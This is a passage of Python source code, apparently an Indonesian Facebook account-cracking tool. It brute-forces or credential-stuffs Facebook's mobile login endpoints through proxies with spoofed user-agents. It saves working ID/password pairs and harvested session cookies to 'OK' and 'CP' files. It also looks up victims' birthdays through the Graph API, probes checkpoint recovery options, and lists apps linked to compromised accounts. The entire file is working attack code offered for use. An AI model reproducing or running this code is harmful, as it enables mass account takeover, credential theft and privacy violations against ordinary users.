			link = ses.get(f"https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8lza5nhc%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D215ad639-e22e-4bd7-9f7f-694c4f4c1e85%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8lza5nhc%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr").text
			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8lza5nhc%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D215ad639-e22e-4bd7-9f7f-694c4f4c1e85%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8lza5nhc%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr", "accept-encoding": "gzip, deflate", "accept-language": "en-US;q=0.8,en;q=0.7"}
			bx = ses.post(f"https://m.facebook.com/login/device-based/login/async/?api_key=1862952583919182&auth_token=aeeafce549277770ab94b30bc4726ff5&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8lza5nhc%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D215ad639-e22e-4bd7-9f7f-694c4f4c1e85%26tp%3Dunspecified&refsrc=deprecated&app_id=1862952583919182&cancel=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_8lza5nhc%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&lwv=100",data=date, headers=head,proxies=proxy)
			if "checkpoint" in ses.cookies.get_dict():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				data = (f'{idf}|{pw}\n{ua}')
				if data in rescp:pass
				else:
					rescp.append(data) 
					cp+=1
					if 'ya' in cepeh:
						cek_opsi(idf,pw,ua)
					else:
						try:
							token = open('.token.txt','r').read()
							bas = {"cookie":open('.cookie.txt','r').read()}
							ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
							m, d, y = ttl.split('/')
							m = tete[m]
							print(f'\n{hh}[•] USER : {kk}{idf}{hh}\n[•] PASS : {kk}{pw}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           \n')
							sapi = f'{idf}|{pw}|{d} {m} {y}'
							open('CP/'+sim_cp,'a').write(sapi+'\n')
							break
						except:
							print(f'\n{kk}{idf}|{kk}{pw}\n')
							#os.popen('play-audio data/cepe.mp3')
							open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
							break
			elif "c_user" in ses.cookies.get_dict():
				kuki = convert(ses.cookies.get_dict())
				idf = re.findall('c_user=(.*);xs', kuki)[0]
				data = (f'{idf}|{pw}\n{kuki}\n{ua}')
				if data in resok:pass
				else:
					resok.append(data)
					ok+=1
					open('OK/'+sim_ok,'a').write(data+'\n')
					if "coki" in akunok:
						print(f'\n{U}[{H}!{U}] USER : {H}{idf}\n{U}[{H}!{U}] PASS : {H}{pw}\n{hh}{kuki}\n')
						#print("\r %s>> %s "%(H,kuki))
						#print("\r  %s*--> %s"%(P,ua))
						#os.popen('play-audio data/woke.mp3')
						break
					elif "apk" in akunok:
						cek_apk(idf,pw,kuki)
						break				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
		#except Exception as e:print(e)
	loop+=1
	

###---[ CEK OPSI AKUN CP ]---###
opsi = []
def sesi(res):
	response = parser(res,'html.parser')
	form = response.find('form',{'method':'post'})
	data = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['hidden','submit']})}
	r = parser(ses.post('https://mbasic.facebook.com'+form.get('action'),data=data).text, 'html.parser')
	for i in r.find_all('option'):
		opsi.append(i.text)
	return opsi		

def cek_opsi(idf,pw,ua):
	akun = ''
	try:
		token = open('.token.txt','r').read()
		bas = {"cookie":open('.cookie.txt','r').read()}
		ttl = ses.get(f'https://graph.facebook.com/{idf}?fields=birthday&access_token={token}',cookies=bas).json()['birthday']
		m, d, y = ttl.split('/')
		m = tete[m]
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}\n [{kk}>{P}] lahir  : {kk}{d} {m} {y}{P}           '
		mek = f"{idf}|{pw}|{day} {month} {year}"
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(mek+'\n')
	except:
		month = ""
		day = ""
		year = ""
		akun += f' [{kk}>{P}] email  : {kk}{idf}{P}          \n [{kk}>{P}] sandi  : {kk}{pw}          {P}'
		if 'file' in detek:pass
		else:open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
	try:
		h2 = {'host':'mbasic.facebook.com','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control':'max-age=0','origin':'https://www.facebook.com','referer':'https://www.facebook.com','sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="101"','upgrade-insecure-requests':'1','user-agent': ua}
		res = ses.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&refsrc=deprecated&_rdr',headers=h2).text
		ress = parser(res, 'html.parser')
		form = ress.find('form',{'method':'post'})
		data2 = {x.get('name'):x.get('value') for x in form.find_all('input',{'type':['submit','hidden']})}
		data2.update({
					'email':idf,
					'pass':pw})
		res = ses.post('https://mbasic.facebook.com'+form.get('action'),data=data2,headers=h2).text
		ress = parser(res, 'html.parser')
		if 'Lihat detail login yang ditampilkan. Ini Anda?' in str(ress.find('title').text):
			akun += f'\n [{hh}>{P}] {hh}hore akun tap yes🎉{P}                       '
		else:
			if(len(sesi(res))==0):
				if 'Masukkan Kode Masuk untuk Melanjutkan' in str(ress.find('title').text):
					akun += f'\n [{kk}>{P}] akun terpasang auten                     '
				else:
					cok = convert(ses.cookies.get_dict())
					akun += f'\n [{hh}>{P}] akun tidak checkpoint                       \n [{hh}>{P}] cookie : {cok}'
			else:
				akun += f'\n [{kk}>{P}] terdapat {len(opsi)} opsi :                     '
				o = 0
				for cp in opsi:
					o+=1
					akun += f'\n [{kk}{o}{P}] {cp}               '
		opsi.clear()
	except Exception as e:
		akun += f'\n [{M}>{P}] kata sandi salah / spam                      '
	print('\r'+ akun)
	print('\r                                                                       ')
		
				
###---[ CONVERT COOKIE ]---###
def convert(cookie):
	cok = ('sb=%s;datr=%s;c_user=%s;xs=%s;fr=%s'%(cookie['sb'],cookie['datr'],cookie['c_user'],cookie['xs'],cookie['fr']))
	return(str(cok))


###---[ CEK APLIKASI ]---###
#--[ convert bahasa ]--#
def language(cookie):
	try:
		url = ses.get('https://mbasic.facebook.com/language/',cookies=cookie)
		data = parser(url.text,'html.parser')
		for x in data.find_all('form',{'method':'post'}):
			if 'Bahasa Indonesia' in str(x):
				bahasa = {"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),"submit"  : "Bahasa Indonesia"}
				eksekusi = ses.post('https://mbasic.facebook.com' + x['action'],data=bahasa,cookies=cookie)
	except:pass

#--[ pusat print ]--#
apk1, apk2, apk3 = [], [], []
def cek_apk(idf,pw,kuki):
	cookie = {"cookie" : kuki}
	language(cookie)
	akun = (f' [{hh}>{P}] email  : {hh}{idf}{P}          \n [{hh}>{P}] sandi  : {hh}{pw}          {P}\n [{hh}>{P}] cookie : {hh}{kuki}{P}')
	try:		
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=active"
		get_active(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"
		get_inactive(url,cookie)
	except Exception as e:pass
	try:			
		url = "https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed"
		get_remove(url,cookie)
	except Exception as e:pass
	print('\r'+akun)
	if len(apk1)==0:pass
	else:
		akun = (f' [{hh}>{P}] aplikasi ditambahkan :                     ')
		no = 0
		for apk in apk1:
			no += 1
			akun += (f'\n {P}[{hh}{no}{P}] {hh}{apk.lower()}            ')
		print('\r'+akun)
	if len(apk2)==0:pass
	else:
		akun = (f' {P}[{kk}>{P}] aplikasi kadaluwarsa :                   ')
		no = 0
		for apk in apk2:
			no += 1
			akun += (f'\n {P}[{kk}{no}{P}] {kk}{apk.lower()}             ')
		print('\r'+akun)
	if len(apk3)==0:pass
	else:
		akun = (f' {P}[{M}>{P}] aplikasi yang dihapus :                  ')
		no = 0
		for apk in apk3:
			no += 1
			akun += (f'\n {P}[{M}{no}{P}] {M}{apk.lower()}               ')
		print('\r'+akun)
	apk1.clear()
	apk2.clear()
	apk3.clear()
	print("\r                                             ")
			
			
#--[ cek apk aktif ]--#
def get_active(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Ditambahkan' in apk.text:					
				apk1.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_active(next,cookie)
	except:pass

#--[ cek apk kadaluarsa ]--#
def get_inactive(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Kedaluwarsa' in apk.text:
				apk2.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_inactive(next,cookie)
	except:pass

#--[ cek apk dihapus ]--#		
def get_remove(url,cookie):
	try:
		data = parser(ses.get(url,cookies=cookie).content,"html.parser")
		for apk in data.find_all('h3'):
			if 'Dihapus' in apk.text:
				apk3.append(f"{str(apk.text).replace('Dihapus',' Dihapus')}")
			else:continue
		next = "https://mbasic.facebook.com" + data.find('a',string='Lihat Lainnya')['href']
		get_remove(next,cookie)
	except:pass
	
def make():
	#try:os.system('pkg install mpv && pkg install play-audio')
	#except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('git pull')
	except:pass   
	clear_layar()
	cookie_no()
	
	
if __name__=='__main__':
	make()	
